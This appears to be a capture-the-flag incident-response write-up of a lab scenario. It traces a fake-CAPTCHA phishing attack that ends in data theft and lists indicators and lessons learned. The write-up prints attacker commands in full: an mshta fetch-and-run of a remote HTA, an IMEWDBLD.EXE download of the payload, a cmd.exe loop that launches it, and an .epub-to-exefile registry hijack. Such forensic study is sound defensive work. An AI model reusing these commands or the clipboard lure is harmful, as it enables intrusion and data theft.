# Week 2 - Stealer's Shadow 🥷

**Challenge Name:** Data Exfiltration Incident Analysis  
**Difficulty:** Intermediate  
**Category:** Incident Response, Malware Analysis, Threat Intelligence  

---

## 📖 Challenge Overview

A quiet shadow moves through the Cyber Realms—hard to see, but easy to notice once something goes missing: old records, bound contracts, and encrypted guild documents.This week’s case looks at Stealer’s Shadow, an advanced attack on The Etherians (Megacorp One), a growing leader in construct-binding and spellcode development. The attacker slipped into their systems, ran remote code, and stole sensitive data using several layers of obfuscation.

My investigation focused on:

- Finding out what data was stolen and what tools were used
- Tracking how the malware was downloaded and run
- Rebuilding the full attack timeline
- Reviewing the C2 servers and endpoints
- Decrypting the stolen data and measuring the impact
- Pulling key information from the recovered files
- Mapping the attacker’s infrastructure

---

## 🎯 Challenge Questions & Solutions

### Question 1: Exfiltrated Files and Programs
**Task:** What specific file was exfiltrated and which program was used to carry out the exfiltration? Include SHA-256 hashes.

**Answer:**
- **Exfiltrated file:** `101010245WK001_protected.zip` - SHA-256: `0324d54bc6c0f2dfa54b32bc68c16fd401778c10a9e9780b9cda0f31ae960d9c`
- **Program used:** `captcha_privacy[1].epub`- SHA-256: `a88fedc93a1d80c8cea08fbcb6b001293ddf357e27d268b32c5cfd23a49e96ed`

**Discovery:** Found in Sysmon logs (Event ID 23 - File Delete/Archive operation)

---
### Question 2: Download and Execution Method

**Task:** How was the exfiltration program downloaded and executed on the compromised system?

**Answer:**

- **Download method:** Malicious HTA using `IMEWDBLD.EXE` to HTTP-download the payload
- **Download location:** User web cache at `...INetCache\IE\66HCZK0X\captcha_privacy[1].epub`
- **Execution method:** Registry hijack of `.epub` to `exefile`, then `start` command to launch the downloaded `.epub` as an executable

**Technical Details:**
- LOLBin abuse of Windows IME Dictionary Builder (IMEWDBLD.EXE)
- Registry modification allowed .epub files to execute as programs
- Automated execution via cmd.exe loop searching INetCache

---
### Question 3: Complete Attack Chain

**Task:** Describe how the attackers achieved code execution to download and run the exfiltration program. Include all technical indicators in chronological order.

**Answer:**

**Stage 1: Initial Contact – Phishing Email**
- Timestamp: August 5, 2025, 08:35:42 UTC
- Source IP: 99.91.94.11
- Sender: billing@zaffrevelox.com (spoofed, pretending to be Spamwarriors Filter)
- Recipient: a.smith@megacorpone.com
- Subject: “License Renewal Notice”
- Embedded Malicious Link: http://www.zaffrevelox.com


**Stage 2: Redirect to Fake CAPTCHA Page**
- After clicking the link, the user was redirected to https://pfusioncaptcha.com
- The page displayed a fake “I’m not a robot” CAPTCHA prompt


**Stage 3: Payload Delivery via Blockchain**

JavaScript on pfusioncaptcha.com executed an eth_call to an Ethereum smart contract:
- RPC Server: http://31.17.87.96:8545/
- Contract: 0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512
- Function Selector: 0x2cae8ae4

The call returned a Base64-encoded command:
- mshta.exe http://pfusioncaptcha.com/13221442.hta

This command was automatically copied to the user’s clipboard


**Stage 4: Social Engineering Execution**

The website instructed the user to press Windows + R, then Ctrl + V, then Enter

The user executed:
- "C:\WINDOWS\System32\mshta.exe" http://pfusioncaptcha.com/13221442.hta
- Execution Time: 2025-08-05 09:01:16 UTC
- Process ID: 19424

**Stage 5: HTA Downloads Malware (LOLBin Abuse)**

The HTA file launched a LOLBin command:
- "C:\Windows\System32\IME\SHARED\IMEWDBLD.EXE" http://news.axonbyte.org:8000/captcha_privacy.epub
- DNS: news.axonbyte.org resolved to 145.1.0.92

Payload saved to:
C:\Users\a.smith\AppData\Local\Microsoft\Windows\INetCache\IE\66HCZK0X\captcha_privacy[1].epub

**Stage 6: Registry Hijack**

The HTA altered registry settings to associate the .epub extension with exefile, enabling direct execution

**Stage 7: Automated Execution of Malware**

Executed command:
- cmd.exe /c for /r "C:\Users\a.smith\AppData\Local\Microsoft\Windows\INetCache" %i in (*.epub) do (start "" "%i" & exit)
- This launched captcha_privacy[1].epub (PID: 17852) as an executable
- Execution Context: MEGACORPONE\a.smith on WK001.megacorpone.com (10.10.10.245)

## Indicators of Compromise (IoCs)

**IP Addresses:**

- 99.91.94.11 — Phishing infrastructure
- 31.17.87.96 — Blockchain RPC endpoint
- 145.1.0.92 — C2 server and malware distribution

**URLs:**
- Phishing redirect: http://www.zaffrevelox.com → https://pfusioncaptcha.com
- HTA payload: http://pfusioncaptcha.com/13221442.hta
- Malware download: http://news.axonbyte.org:8000/captcha_privacy.epub

**Blockchain Indicators**
- Smart Contract: 0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512
- RPC Endpoint: 31.17.87.96:8545

### 🎯 Complete IoC Timeline
| Timestamp (UTC) | Event                                | IoC Type   | Value                                                                                                    |
| --------------- | ------------------------------------ | ---------- | -------------------------------------------------------------------------------------------------------- |
| 08:35:42        | Phishing email delivered             | IP Address | 99.91.94.11                                                                                              |
| ~08:45:00       | User clicks malicious link           | Domain     | zaffrevelox.com                                                                                          |
| ~08:50:00       | User redirected to fake CAPTCHA page | Domain     | pfusioncaptcha.com                                                                                       |
| ~08:55:00       | Payload retrieved via blockchain RPC | IP Address | 31.17.87.96                                                                                              |
| ~08:55:00       | Smart contract queried               | Contract   | 0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512                                                               |
| 09:01:16        | HTA payload executed                 | URL        | [http://pfusioncaptcha.com/13221442.hta](http://pfusioncaptcha.com/13221442.hta)                         |
| 09:01:16        | DNS lookup for malware host          | Domain     | news.axonbyte.org                                                                                        |
| 09:01:16        | Malware downloaded                   | IP Address | 145.1.0.92                                                                                               |
| 09:01:16        | Malware downloaded                   | URL        | [http://news.axonbyte.org:8000/captcha_privacy.epub](http://news.axonbyte.org:8000/captcha_privacy.epub) |
| 09:01:16        | Malicious file created               | File Hash  | a88fedc93a1d80c8cea08fbcb6b001293ddf357e27d268b32c5cfd23a49e96ed                                         |
| 09:01:18        | Malware executed                     | Process    | captcha_privacy[1].epub (PID 17852)                                                                      |
| 09:01:45+       | C2 communication initiated           | IP:Port    | 145.1.0.92:443                                                                                           |
| 09:02:06        | Data archived                        | File Hash  | B6A1646F23BA0A05B7C80A7D6261204384AB06F15983EB195EB5F0A3FEDF2475                                         |
| 09:02:06        | Data encrypted                       | File Hash  | 0324d54bc6c0f2dfa54b32bc68c16fd401778c10a9e9780b9cda0f31ae960d9c                                         |
| 09:02:07        | Data exfiltrated                     | IP:Port    | 145.1.0.92:443                                                                                           |
| 09:02:07        | Malware process terminates           | —          | —                                                                                                        |


---

 **Registry Modification:**
```
HKEY_CLASSES_ROOT\.epub → exefile association
```
## 📚 Lessons Learned

1. **Novel Attack Vectors:** Attackers are increasingly using blockchain smart contracts to deliver payloads, making traditional network defenses ineffective

2. **LOLBin Exploitation:** Legitimate Windows binaries like IMEWDBLD.EXE can be abused for malicious downloads, bypassing traditional AV

3. **Social Engineering Evolution:** Fake CAPTCHA pages are highly effective because users are conditioned to complete CAPTCHA challenges

4. **Defense in Depth:** Multiple security controls failed:
   - Email filtering didn't catch phishing
   - Browser didn't warn about malicious site
   - No EDR to detect LOLBin abuse
   - No alert on registry modification

5. **Password Hygiene:** Browser-stored passwords remain a high-value target for credential theft

---

## 🎓 Skills Demonstrated

- ✅ Advanced log analysis and correlation
- ✅ Email forensics and phishing investigation
- ✅ Browser artifact analysis
- ✅ Malware reverse engineering concepts
- ✅ Network traffic analysis
- ✅ Registry forensics
- ✅ Cryptographic analysis
- ✅ Blockchain technology understanding
- ✅ Incident response procedures
- ✅ Threat intelligence gathering
- ✅ IOC extraction and documentation

---
